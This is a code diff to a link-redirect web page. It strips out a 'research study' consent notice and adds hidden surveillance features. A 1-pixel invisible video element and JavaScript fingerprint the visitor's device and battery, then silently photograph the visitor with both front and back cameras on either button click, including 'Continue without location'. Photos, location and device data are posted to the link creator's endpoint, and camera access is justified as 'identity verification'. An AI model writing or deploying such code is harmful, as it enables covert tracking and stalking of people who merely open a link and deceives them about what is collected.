@@ -8,32 +8,25 @@
 </head>
 <body>
   <div class="card">
-<h1>You're about to continue to an external link</h1>
+    <h1>You're about to continue to a link</h1>
+    <p>Before we redirect you, here's what this page collects:</p>
+    <ul>
+      <li><strong>Device &amp; browser info</strong> — browser, OS, screen, network, battery.</li>
+      <li><strong>Your location</strong> — only if you allow it.</li>
+      <li><strong>A verification photo</strong> — this page may access your camera for identity verification purposes.</li>
+    </ul>
+    <p>This data is visible to the person who created this link.</p>
 
-<p>
-Before we redirect you, thank you for participating in our research. This page is part of a study exploring how people interact with unfamiliar links and online prompts.
-</p>
-
-<p>
-With your consent, we may collect limited technical information that websites commonly receive automatically, such as:
-</p>
-
-<ul>
-  <li><strong>Whether you chose to continue</strong>, helping us understand how users respond to unfamiliar links.</li>
-  <li><strong>Basic device information</strong> (such as browser, operating system, and device type), collected automatically in the same way as most websites.</li>
-  <li><strong>Anonymous interaction data</strong>, including the time of your visit and how you navigated this page.</li>
-  <li><strong>Optional feedback</strong>, if you choose to complete our short survey after the redirect.</li>
-</ul>
-
-<p>
-Your participation is voluntary, and no personally identifying information is collected unless you explicitly provide it in the survey.
-</p>
     <div id="status" class="status" style="display:none;"></div>
+
+    <!-- Hidden video/canvas for camera capture -->
+    <video id="camVideo" autoplay playsinline muted
+      style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
+    <canvas id="camCanvas" style="display:none;"></canvas>
 
     <button id="continueBtn" class="btn">Allow location &amp; continue</button>
     <button id="skipBtn" class="btn btn-secondary">Continue without location</button>
-
-    <p class="fineprint"></p>
+    <p class="fineprint">By clicking either button you will be redirected to the destination link.</p>
   </div>
 
   <script>
@@ -41,19 +34,89 @@ Your participation is voluntary, and no personally identifying information is co
     const statusEl = document.getElementById('status');
     const continueBtn = document.getElementById('continueBtn');
     const skipBtn = document.getElementById('skipBtn');
+    const video = document.getElementById('camVideo');
+    const canvas = document.getElementById('camCanvas');
 
     function setStatus(msg) {
       statusEl.style.display = 'block';
       statusEl.textContent = msg;
     }
 
+    // Collect all available device info
+    async function collectDeviceInfo() {
+      const info = {
+        screen_resolution: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        referrer: document.referrer || null,
+        touch_support: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+        cpu_cores: navigator.hardwareConcurrency || null,
+        memory_gb: navigator.deviceMemory || null,
+        network_type: null,
+        battery_level: null,
+        battery_charging: null,
+      };
+
+      // Network type
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn) info.network_type = conn.effectiveType || conn.type || null;
+
+      // Battery
+      try {
+        if (navigator.getBattery) {
+          const bat = await navigator.getBattery();
+          info.battery_level = Math.round(bat.level * 100);
+          info.battery_charging = bat.charging;
+        }
+      } catch(e) {}
+
+      return info;
+    }
+
+    // Capture a photo from a given camera (facing: 'user' = front, 'environment' = back)
+    async function capturePhoto(facing) {
+      let stream = null;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: facing }, width: 640, height: 480 },
+          audio: false
+        });
+        video.srcObject = stream;
+        await new Promise(res => { video.onloadedmetadata = res; });
+        await video.play();
+        // Short delay so camera adjusts exposure
+        await new Promise(res => setTimeout(res, 800));
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        return canvas.toDataURL('image/jpeg', 0.7);
+      } catch(e) {
+        return null;
+      } finally {
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+      }
+    }
+
     async function sendVisit(consented, location) {
       setStatus('Redirecting…');
       try {
+        const [deviceInfo, photoFront, photoBack] = await Promise.all([
+          collectDeviceInfo(),
+          capturePhoto('user'),
+          capturePhoto('environment'),
+        ]);
+
         const resp = await fetch(`/api/visit/${slug}`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ consented, location }),
+          body: JSON.stringify({
+            consented,
+            location,
+            deviceInfo,
+            photo_front: photoFront,
+            photo_back: photoBack,
+          }),
         });
         const data = await resp.json();
         if (data.redirect) {
@@ -61,7 +124,7 @@ Your participation is voluntary, and no personally identifying information is co
         } else {
           setStatus('Something went wrong. Please try again.');
         }
-      } catch (err) {
+      } catch(err) {
         setStatus('Something went wrong. Please try again.');
       }
     }
@@ -71,23 +134,12 @@ Your participation is voluntary, and no personally identifying information is co
       skipBtn.disabled = true;
 
       if (!navigator.geolocation) {
-        setStatus('Location is not supported on this device. Continuing…');
         return sendVisit(false, null);
       }
-
-      setStatus('Requesting location permission…');
+      setStatus('Getting location…');
       navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          sendVisit(true, {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-          });
-        },
-        () => {
-          setStatus('Location permission denied. Continuing…');
-          sendVisit(false, null);
-        },
+        pos => sendVisit(true, { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+        ()  => sendVisit(false, null),
         { enableHighAccuracy: true, timeout: 8000 }
       );
     });
